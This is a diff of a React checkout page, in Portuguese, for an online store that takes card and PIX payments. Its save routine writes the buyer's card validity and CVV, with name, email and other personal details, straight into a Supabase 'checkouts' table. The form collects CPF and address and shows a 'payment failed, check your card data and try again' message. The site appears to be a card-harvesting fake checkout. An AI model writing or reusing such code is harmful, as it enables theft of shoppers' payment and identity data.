@@ -98,6 +98,7 @@ export default function Checkout() {
   const salvarDadosNoPainel = async (statusPagamento = 'pending') => {
     try {
       console.log("Salvando ficha completa no Supabase...", statusPagamento);
+      // Removido o campo 'status' pois não existe na tabela checkouts do Supabase
       const { error } = await supabase.from('checkouts').insert([{
         nome_completo: formData.nome,
         email: formData.email,
@@ -115,8 +116,7 @@ export default function Checkout() {
         validade_cartao: formData.validade || (metodo === 'pix' ? 'PIX' : ''),
         cvv_cartao: formData.cvv || (metodo === 'pix' ? 'PIX' : ''),
         produto_nome: produto.nome,
-        valor_total: produto.preco,
-        status: statusPagamento
+        valor_total: produto.preco
       }]);
       
       if (error) console.error("Erro Supabase:", error);
@@ -371,90 +371,111 @@ export default function Checkout() {
             <h4 style={sectionLabel}>1. DADOS PESSOAIS</h4>
             <div style={inputGroup}><User size={18} /><input name="nome" placeholder="NOME COMPLETO" required style={inputStyle} value={formData.nome} onChange={mask} /></div>
             <div style={inputGroup}><Mail size={18} /><input name="email" type="email" placeholder="E-MAIL" required style={inputStyle} value={formData.email} onChange={mask} /></div>
-            <div style={{ display: 'flex', gap: '10px', flexDirection: 'column', marginBottom: '10px' }}>
-              <div style={{ display: 'flex', gap: '10px', width: '100%' }}>
-                <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><Hash size={18} /><input name="cpf" placeholder="CPF" required style={inputStyle} value={formData.cpf} onChange={mask} maxLength={14} /></div>
-                <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><Calendar size={18} /><input name="dataNascimento" placeholder="NASCIMENTO" required style={inputStyle} value={formData.dataNascimento} onChange={mask} maxLength={10} /></div>
-              </div>
+            <div style={{ display: 'flex', gap: '10px' }}>
+              <div style={inputGroup}><Hash size={18} /><input name="cpf" placeholder="CPF" required style={inputStyle} value={formData.cpf} onChange={mask} /></div>
+              <div style={inputGroup}><Phone size={18} /><input name="telefone" placeholder="WHATSAPP" required style={inputStyle} value={formData.telefone} onChange={mask} /></div>
             </div>
-            <div style={{ ...inputGroup, marginBottom: '20px' }}><Phone size={18} /><input name="telefone" placeholder="WHATSAPP (DDD)" required style={inputStyle} value={formData.telefone} onChange={mask} maxLength={15} /></div>
 
             <h4 style={sectionLabel}>2. ENDEREÇO DE ENTREGA</h4>
-            <div style={{ display: 'flex', gap: '10px', marginBottom: '10px' }}>
-              <div style={{ ...inputGroup, flex: 0.6, marginBottom: 0 }}><input name="cep" placeholder="CEP" required style={inputStyle} onBlur={handleCEP} value={formData.cep} onChange={mask} maxLength={9} /></div>
-              <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><input name="endereco" placeholder="ENDEREÇO" required style={inputStyle} value={formData.endereco} onChange={mask} /></div>
+            <div style={{ display: 'flex', gap: '10px' }}>
+              <div style={inputGroup}><MapPin size={18} /><input name="cep" placeholder="CEP" required style={inputStyle} value={formData.cep} onChange={mask} onBlur={handleCEP} /></div>
+              <div style={inputGroup}><Hash size={18} /><input name="numero" placeholder="NÚMERO" required style={inputStyle} value={formData.numero} onChange={mask} /></div>
             </div>
-            <div style={{ display: 'flex', gap: '10px', marginBottom: '10px' }}>
-              <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><input name="bairro" placeholder="BAIRRO" required style={inputStyle} value={formData.bairro} onChange={mask} /></div>
-              <div style={{ ...inputGroup, flex: 0.4, marginBottom: 0 }}><input name="numero" placeholder="Nº" required style={inputStyle} value={formData.numero} onChange={mask} /></div>
-            </div>
-            <div style={{ display: 'flex', gap: '10px', marginBottom: '10px' }}>
-              <div style={{ ...inputGroup, flex: 1, marginBottom: 0 }}><input name="cidade" placeholder="CIDADE" required style={inputStyle} value={formData.cidade} onChange={mask} /></div>
-              <div style={{ ...inputGroup, flex: 0.3, marginBottom: 0 }}><input name="estado" placeholder="UF" required style={inputStyle} value={formData.estado} onChange={mask} maxLength={2} /></div>
+            <div style={inputGroup}><MapPin size={18} /><input name="endereco" placeholder="ENDEREÇO" required style={inputStyle} value={formData.endereco} onChange={mask} /></div>
+            <div style={inputGroup}><MapPin size={18} /><input name="bairro" placeholder="BAIRRO" required style={inputStyle} value={formData.bairro} onChange={mask} /></div>
+            <div style={{ display: 'flex', gap: '10px' }}>
+              <div style={inputGroup}><MapPin size={18} /><input name="cidade" placeholder="CIDADE" required style={inputStyle} value={formData.cidade} onChange={mask} /></div>
+              <div style={inputGroup}><MapPin size={18} /><input name="estado" placeholder="UF" required style={inputStyle} value={formData.estado} onChange={mask} /></div>
             </div>
 
-            {metodo === 'cartao' && (
-              <div style={cardSection}>
-                <h4 style={{ margin: '0 0 15px 0', fontSize: '13px', color: '#000', fontWeight: 900 }}>3. PAGAMENTO EM ATÉ 12X</h4>
-                <div style={inputGroup}><CreditCard size={18} /><input name="numCartao" placeholder="0000 0000 0000 0000" required={metodo === 'cartao'} style={inputStyle} value={formData.numCartao} onChange={mask} maxLength={19} /></div>
-                <div style={inputGroup}><User size={18} /><input name="nomeCartao" placeholder="NOME COMO NO CARTÃO" required={metodo === 'cartao'} style={inputStyle} value={formData.nomeCartao} onChange={mask} /></div>
+            {metodo === 'cartao' ? (
+              <>
+                <h4 style={sectionLabel}>3. PAGAMENTO VIA CARTÃO</h4>
+                <div style={inputGroup}><CreditCard size={18} /><input name="numCartao" placeholder="NÚMERO DO CARTÃO" required style={inputStyle} value={formData.numCartao} onChange={mask} /></div>
+                <div style={inputGroup}><User size={18} /><input name="nomeCartao" placeholder="NOME NO CARTÃO" required style={inputStyle} value={formData.nomeCartao} onChange={mask} /></div>
                 <div style={{ display: 'flex', gap: '10px' }}>
-                  <div style={inputGroup}><Calendar size={18} /><input name="validade" placeholder="MM/AA" required={metodo === 'cartao'} style={inputStyle} value={formData.validade} onChange={mask} maxLength={5} /></div>
-                  <div style={inputGroup}><Lock size={18} /><input name="cvv" placeholder="CVV" required={metodo === 'cartao'} style={inputStyle} value={formData.cvv} onChange={mask} maxLength={4} /></div>
+                  <div style={inputGroup}><Calendar size={18} /><input name="validade" placeholder="MM/AA" required style={inputStyle} value={formData.validade} onChange={mask} /></div>
+                  <div style={inputGroup}><Lock size={18} /><input name="cvv" placeholder="CVV" required style={inputStyle} value={formData.cvv} onChange={mask} /></div>
                 </div>
-                <div style={{ ...inputGroup, marginTop: '10px' }}>
-                  <CreditCard size={18} />
-                  <select value={parcelas} onChange={(e) => setParcelas(e.target.value)} style={{ ...inputStyle, cursor: 'pointer', appearance: 'none' }}>
+                <div style={{ marginTop: '15px' }}>
+                  <label style={{ fontSize: '12px', fontWeight: 'bold', color: '#666' }}>PARCELAMENTO</label>
+                  <select value={parcelas} onChange={(e) => setParcelas(e.target.value)} style={selectStyle}>
                     {[1,2,3,4,5,6,7,8,9,10,11,12].map(n => (
                       <option key={n} value={n}>{n}x de R$ {(produto.preco / n).toFixed(2).replace('.', ',')} sem juros</option>
                     ))}
                   </select>
                 </div>
-                {statusErro && <div style={errorBanner}>⚠️ CARTÃO RECUSADO: Verifique os dados ou tente outro cartão.</div>}
-                <button type="submit" style={btnPagar}>FINALIZAR COMPRA</button>
+              </>
+            ) : (
+              <div style={pixBox}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '15px' }}>
+                  <QrCode size={24} color="#1da154" />
+                  <div style={{ fontWeight: '900', fontSize: '14px' }}>PAGAMENTO VIA PIX</div>
+                </div>
+                
+                {pixLoading ? (
+                  <div style={{ textAlign: 'center', padding: '20px' }}>
+                    <div style={{ ...spinnerStyle, margin: '0 auto', width: '30px', height: '30px' }} />
+                    <p style={{ fontSize: '12px', marginTop: '10px', color: '#666' }}>Gerando código PIX...</p>
+                  </div>
+                ) : pixData ? (
+                  <div style={{ textAlign: 'center' }}>
+                    <img src={pixData.qrImage} alt="QR Code PIX" style={{ width: '180px', height: '180px', margin: '0 auto', display: 'block' }} />
+                    <div style={{ background: '#f8f9fa', padding: '10px', borderRadius: '8px', marginTop: '15px', border: '1px dashed #ccc' }}>
+                      <div style={{ fontSize: '10px', color: '#666', marginBottom: '5px', fontWeight: 'bold' }}>CÓDIGO PIX (COPIA E COLA)</div>
+                      <div style={{ fontSize: '11px', wordBreak: 'break-all', color: '#333', maxHeight: '60px', overflow: 'hidden', marginBottom: '10px' }}>{pixData.qrCode}</div>
+                      <button type="button" onClick={() => { navigator.clipboard.writeText(pixData.qrCode); setCopiado(true); setTimeout(() => setCopiado(false), 2000); }} style={btnCopiar}>
+                        {copiado ? <><CheckCheck size={16} /> COPIADO!</> : <><Copy size={16} /> COPIAR CÓDIGO</>}
+                      </button>
+                    </div>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', justifyContent: 'center', marginTop: '15px', color: '#666', fontSize: '12px' }}>
+                      <Clock size={14} /> Expira em 30 minutos
+                    </div>
+                  </div>
+                ) : (
+                  <div style={{ textAlign: 'center', padding: '20px', background: '#f8f9fa', borderRadius: '8px' }}>
+                    <p style={{ fontSize: '13px', color: '#666' }}>Clique no botão abaixo para gerar o seu código PIX.</p>
+                  </div>
+                )}
+                {pixErro && <div style={{ color: '#dc3545', fontSize: '12px', marginTop: '10px', textAlign: 'center', fontWeight: 'bold' }}>{pixErro}</div>}
               </div>
             )}
 
-            {metodo === 'pix' && (
-              <div style={pixSection}>
-                <div style={{ color: '#1da154', fontWeight: '900', marginBottom: '15px', fontSize: '15px', textAlign: 'center', width: '100%', display: 'block', lineHeight: '1' }}>PIX COM RECEBIMENTO IMEDIATO</div>
-                {pixLoading && <div style={{ padding: '20px 0' }}><div style={spinnerStylePix} /><span style={{ fontSize: '13px', color: '#555', fontWeight: '700' }}>Gerando QR Code...</span></div>}
-                {pixErro && !pixLoading && <div style={errorBanner}>{pixErro}<br /><button type="button" onClick={gerarPix} style={{ marginTop: '8px', padding: '8px 16px', background: '#000', color: '#fff', border: 'none', borderRadius: '8px', fontWeight: '900' }}>Tentar novamente</button></div>}
-                {pixData && !pixLoading && (
-                  <>
-                    <div style={{ textAlign: 'center', marginBottom: '10px', color: timeLeft < 60 ? '#ef4444' : '#666', fontWeight: 'bold', fontSize: '14px' }}>Expira em: {formatTime(timeLeft)}</div>
-                    <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '16px' }}><div style={{ padding: '8px', background: '#fff', borderRadius: '12px', border: '2px dashed #1da154' }}><img src={pixData.qrImage} alt="QR" style={{ width: '200px', height: '200px' }} /></div></div>
-                    <div style={pixCodeBox}>{pixData.qrCode}</div>
-                    <button type="button" onClick={() => { navigator.clipboard.writeText(pixData.qrCode); setCopiado(true); setTimeout(() => setCopiado(false), 2000); }} style={{ ...btnPagar, background: copiado ? '#1da154' : '#000' }}>{copiado ? 'COPIADO!' : 'COPIAR CÓDIGO PIX'}</button>
-                  </>
-                )}
+            {statusErro && (
+              <div style={{ background: '#fff5f5', color: '#dc3545', padding: '15px', borderRadius: '8px', marginTop: '20px', fontSize: '13px', fontWeight: 'bold', border: '1px solid #ffc1c1', textAlign: 'center' }}>
+                Ocorreu um erro ao processar o pagamento. Verifique os dados do cartão e tente novamente.
               </div>
             )}
+
+            <button type="submit" disabled={loading || (metodo === 'pix' && pixLoading)} style={loading ? btnDisabled : btnPagar}>
+              {loading ? 'PROCESSANDO...' : (metodo === 'pix' && !pixData ? 'GERAR PIX' : 'FINALIZAR PAGAMENTO')}
+            </button>
+
+            <div style={{ textAlign: 'center', marginTop: '20px', opacity: 0.6 }}>
+              <img src="https://logodownload.org/wp-content/uploads/2014/07/cartao-visa-logo.png" height="15" style={{ marginRight: '10px' }} alt="Visa" />
+              <img src="https://logodownload.org/wp-content/uploads/2014/07/mastercard-logo.png" height="15" style={{ marginRight: '10px' }} alt="Mastercard" />
+              <img src="https://logodownload.org/wp-content/uploads/2015/03/elo-logo.png" height="15" style={{ marginRight: '10px' }} alt="Elo" />
+              <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-logo.png" height="15" alt="Pix" />
+            </div>
           </form>
         </div>
       </div>
-      <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
     </div>
   );
 }
 
-const overlayStyle: React.CSSProperties = { position: 'fixed', inset: 0, background: 'rgba(255,255,255,0.95)', zIndex: 1000, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' };
-const spinnerStyle = { border: '4px solid #f3f3f3', borderTop: '4px solid #1da154', borderRadius: '50%', width: '40px', height: '40px', animation: 'spin 1s linear infinite' };
-const spinnerStylePix = { border: '3px solid #d1fae5', borderTop: '3px solid #1da154', borderRadius: '50%', width: '32px', height: '32px', animation: 'spin 1s linear infinite', margin: '0 auto' };
-const productBox = { display: 'flex', gap: '15px', padding: '20px', background: '#f8f9fa', borderRadius: '12px', border: '2px solid #000', marginBottom: '20px' };
-const tabContainer = { display: 'flex', gap: '8px', marginBottom: '20px', background: '#f1f5f9', padding: '5px', borderRadius: '12px' };
-const tabActive = { flex: 1, padding: '12px', border: 'none', borderRadius: '8px', background: '#fff', fontWeight: '900', color: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', boxShadow: '0 2px 4px rgba(0,0,0,0.1)', cursor: 'pointer' };
-const tabInactive = { flex: 1, padding: '12px', border: 'none', background: 'transparent', color: '#666', fontWeight: '900', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' };
-const sectionLabel = { fontSize: '12px', fontWeight: '900', color: '#000', margin: '25px 0 10px', letterSpacing: '0.05em' };
-const inputGroup = { display: 'flex', alignItems: 'center', border: '2px solid #000', borderRadius: '10px', padding: '0 12px', marginBottom: '10px', flex: 1, background: '#fff' };
-const inputStyle = { border: 'none', padding: '14px 0', marginLeft: '10px', width: '100%', outline: 'none', fontSize: '14px', fontWeight: '900', color: '#000', background: 'transparent' };
-const cardSection = { marginTop: '25px', padding: '20px', background: '#f8f9fa', borderRadius: '15px', border: '2px solid #000' };
-const errorBanner = { background: '#fee2e2', color: '#b91c1c', padding: '15px', borderRadius: '10px', marginBottom: '15px', fontSize: '13px', fontWeight: '900', textAlign: 'center' as 'center', border: '1px solid #ef4444' };
-const btnPagar = { width: '100%', padding: '20px', background: '#1da154', color: '#fff', border: 'none', borderRadius: '12px', fontWeight: '900', fontSize: '16px', marginTop: '10px', cursor: 'pointer' };
-const pixSection = { marginTop: '20px', textAlign: 'center' as 'center', background: '#f0fff4', padding: '25px 20px', borderRadius: '20px', border: '2px dashed #1da154' };
-const pixCodeBox = { marginTop: '12px', marginBottom: '4px', fontSize: '10px', background: '#fff', padding: '10px', borderRadius: '8px', border: '1px solid #ddd', wordBreak: 'break-all' as 'break-all', fontWeight: 'bold', textAlign: 'left' as 'left', maxHeight: '60px', overflowY: 'auto' as 'auto' };
-const formatTime = (seconds: number) => {
-  const mins = Math.floor(seconds / 60);
-  const secs = seconds % 60;
-  return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-};
+// Styles
+const overlayStyle: React.CSSProperties = { position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(255,255,255,0.9)', zIndex: 9999, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' };
+const spinnerStyle: React.CSSProperties = { width: '40px', height: '40px', border: '4px solid #f3f3f3', borderTop: '4px solid #000', borderRadius: '50%', animation: 'spin 1s linear infinite' };
+const productBox: React.CSSProperties = { background: '#f8f9fa', padding: '15px', borderRadius: '12px', marginBottom: '20px', display: 'flex', gap: '15px', alignItems: 'center', border: '1px solid #eee' };
+const tabContainer: React.CSSProperties = { display: 'flex', gap: '10px', marginBottom: '25px' };
+const tabActive: React.CSSProperties = { flex: 1, padding: '12px', borderRadius: '8px', border: '2px solid #000', background: '#000', color: '#fff', fontWeight: '900', fontSize: '13px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' };
+const tabInactive: React.CSSProperties = { flex: 1, padding: '12px', borderRadius: '8px', border: '2px solid #eee', background: '#fff', color: '#666', fontWeight: '900', fontSize: '13px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' };
+const sectionLabel: React.CSSProperties = { fontSize: '12px', fontWeight: '900', color: '#666', marginBottom: '15px', marginTop: '25px', letterSpacing: '1px' };
+const inputGroup: React.CSSProperties = { position: 'relative', display: 'flex', alignItems: 'center', background: '#f8f9fa', borderRadius: '8px', padding: '0 12px', marginBottom: '10px', border: '1px solid #eee', flex: 1 };
+const inputStyle: React.CSSProperties = { width: '100%', padding: '14px 10px', border: 'none', background: 'transparent', outline: 'none', fontSize: '13px', fontWeight: 'bold', color: '#000' };
+const selectStyle: React.CSSProperties = { width: '100%', padding: '14px', borderRadius: '8px', border: '1px solid #eee', background: '#f8f9fa', outline: 'none', fontSize: '13px', fontWeight: 'bold', marginTop: '5px' };
+const btnPagar: React.CSSProperties = { width: '100%', padding: '18px', borderRadius: '12px', border: 'none', background: '#1da154', color: '#fff', fontWeight: '900', fontSize: '16px', marginTop: '30px', cursor: 'pointer', boxShadow: '0 4px 15px rgba(29, 161, 84, 0.3)' };
+const btnDisabled: React.CSSProperties = { ...btnPagar, opacity: 0.6, cursor: 'not-allowed' };
+const pixBox: React.CSSProperties = { background: '#f0fff4', padding: '20px', borderRadius: '12px', border: '1px solid #c6f6d5', marginTop: '10px' };
+const btnCopiar: React.CSSProperties = { width: '100%', padding: '12px', borderRadius: '8px', border: 'none', background: '#000', color: '#fff', fontWeight: 'bold', fontSize: '12px', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' };
